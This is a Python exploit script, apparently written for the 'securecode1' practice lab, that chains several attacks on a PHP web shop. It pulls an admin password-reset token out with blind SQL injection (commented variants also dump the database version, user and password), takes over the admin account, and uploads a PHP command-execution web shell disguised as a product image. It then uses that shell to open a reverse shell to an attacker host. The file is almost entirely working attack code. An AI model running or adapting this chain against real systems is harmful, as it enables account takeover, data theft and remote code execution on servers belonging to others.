from ipaddress import ip_address
import sys
import requests
import argparse

exfilData = []

def passwordReset(targetip, targetport):
    try:
        burp0_url = "http://" + targetip + ":" + targetport + "/login/resetPassword.php"
        burp0_cookies = {"PHPSESSID": "g79jmok31s2ectdeqaiboivhbo"}
        burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://securecode1", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://securecode1/login/resetPassword.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
        burp0_data = {"username": "admin"}
        requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
    except:
        print("[ERROR] Password reset failed.")

def changePassword(targetip, targetport, token, password): 
    #Password reset request
    try:
        burp0_url = "http://" + targetip + ":" + targetport + "/login/doChangePassword.php"
        burp0_cookies = {"PHPSESSID": "g79jmok31s2ectdeqaiboivhbo"}
        burp0_headers = {"Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close", "Content-Type": "application/x-www-form-urlencoded"}
        burp0_data = {"token": token, "password": password}
        response = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data) 
        print("Password successfully reset to " + password)
        adminLogin(targetip, targetport, password)
        uploadBackdoor(targetip, targetport)

    except:
        print("[ERROR] Password reset failed.")

def adminLogin(targetip, targetport, password):
    try:
        burp0_url = "http://" + targetip + ":" + targetport + "/login/checkLogin.php"
        burp0_cookies = {"PHPSESSID": "g79jmok31s2ectdeqaiboivhbo"}
        burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://securecode1", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://securecode1/login/login.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
        burp0_data = {"username": "admin", "password": password}
        requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
        print("Login success!")
    except:
        print("[ERROR] Admin user login failed.")

#need to replace the burp cookie with legit cookie
def uploadBackdoor(targetip, targetport):
    try:
        burp0_url = "http://" + targetip + ":" + targetport + "/item/updateItem.php"
        burp0_cookies = {"PHPSESSID": "g79jmok31s2ectdeqaiboivhbo"}
        burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://securecode1", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryOyeix4f7Vai9Oquf", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://securecode1/item/editItem.php?id=1", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
        burp0_data = "------WebKitFormBoundaryOyeix4f7Vai9Oquf\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n1\r\n------WebKitFormBoundaryOyeix4f7Vai9Oquf\r\nContent-Disposition: form-data; name=\"id_user\"\r\n\r\n1\r\n------WebKitFormBoundaryOyeix4f7Vai9Oquf\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\nRaspery Pi 4\r\n------WebKitFormBoundaryOyeix4f7Vai9Oquf\r\nContent-Disposition: form-data; name=\"image\"; filename=\"simple_backdoor.phar\"\r\nContent-Type: text/html\r\n\r\n<?php if(isset($_REQUEST['cmd'])){ echo \"<pre>\"; $cmd = ($_REQUEST['cmd']); system($cmd); echo \"</pre>\"; die; }?>\n\r\n------WebKitFormBoundaryOyeix4f7Vai9Oquf\r\nContent-Disposition: form-data; name=\"description\"\r\n\r\nLatest Raspberry Pi 4 Model B with 2/4/8GB RAM raspberry pi 4 BCM2711 Quad core Cortex-A72 ARM v8 1.5GHz Speeder Than Pi 3B\r\n------WebKitFormBoundaryOyeix4f7Vai9Oquf\r\nContent-Disposition: form-data; name=\"price\"\r\n\r\n92\r\n------WebKitFormBoundaryOyeix4f7Vai9Oquf--\r\n"
        requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
        print("Payload uploaded successfully.")
    except:
        print("[ERROR] Payload upload failed.")

def reverseShell(targetip, targetport, ip, port):
    try:
        burp0_url = "http://" + targetip + ":" + targetport + "/item/image/simple_backdoor.phar?cmd=php%20-r%20%27%24sock%3dfsockopen%28%22" + ip + "%22%2c" + port + "%29%3bexec%28%22%2fbin%2fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3b%27"
        burp0_cookies = {"PHPSESSID": "g79jmok31s2ectdeqaiboivhbo"}
        burp0_headers = {"Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
        print("Reverse shell successfull.  Check your listener.")
        requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    except:
        print("[ERROR] Reverse shell failed.")

def checkSqli(inj_str, ip, port):
    for values in range(32, 126):
        burp0_url = ("http://" + ip + ":" + port + "/item/viewItem.php?id=" + inj_str.replace("[CHAR]", str(values)))
        burp0_cookies = {"PHPSESSID": "l1hkg7o30au4rnqg90da82jhip"}
        burp0_headers = {"Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
        r = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies, allow_redirects=False)
        if r.status_code != 302:
            return values
    return None

def main():
    parser = argparse.ArgumentParser(description='Collect target arguments.')
    parser.add_argument('--targetip', type=str, required=True, help='Enter target hostname or IP')
    parser.add_argument('--targetport', type=str, required=True, help='Enter target port number')
    parser.add_argument('--attackerip', type=str, required=True, help='Enter attacker hostname or IP')
    parser.add_argument('--attackerport', type=str, required=True, help='Enter attacker port number')
    parser.add_argument('--password', type=str, required=True, help='Password string to set Admin user to')
    args = parser.parse_args()
    passwordReset(args.targetip, args.targetport)
    for each in range(1, 100):
        # Database Version Query
        #injectionQuery = "1/**/AND/**/(ascii(substring((select/**/version()),%d,1)))=[CHAR]%%23" % each
        # Calling user query
        #injectionQuery = "1/**/AND/**/(ascii(substring((select/**/user()),%d,1)))=[CHAR]%%23" % each
        # Database name query
        #injectionQuery = "1/**/AND/**/(ascii(substring((select/**/database()),%d,1)))=[CHAR]%%23" % each
        # Database username query
        #injectionQuery = "1/**/AND/**/(ascii(substring((select/**/username/**/from/**/user/**/where/**/id/**/=/**/3),%d,1)))=[CHAR]%%23" % each
        # Database password query
        #injectionQuery = "1/**/AND/**/(ascii(substring((select/**/password/**/from/**/user/**/where/**/id/**/=/**/1),%d,2)))=[CHAR]%%23" % each
        # Database token query
        injectionQuery = "1/**/AND/**/(ascii(substring((select/**/token/**/from/**/user/**/where/**/id/**/=/**/1),%d,2)))=[CHAR]%%23" % each
        try:
            exfilChar = chr(checkSqli(injectionQuery, args.targetip, args.targetport))
            sys.stdout.write(exfilChar)
            exfilData.append(exfilChar)
            sys.stdout.flush()
        except:
            print("\n[+] All Characters Found!")
            break
    finalData = (''.join(map(str, exfilData)))
    print("\nData: "+ finalData)
    changePassword(args.targetip, args.targetport, finalData, args.password)
    reverseShell(args.targetip, args.targetport, args.attackerip, args.attackerport)
    
if __name__ == "__main__":
    main()
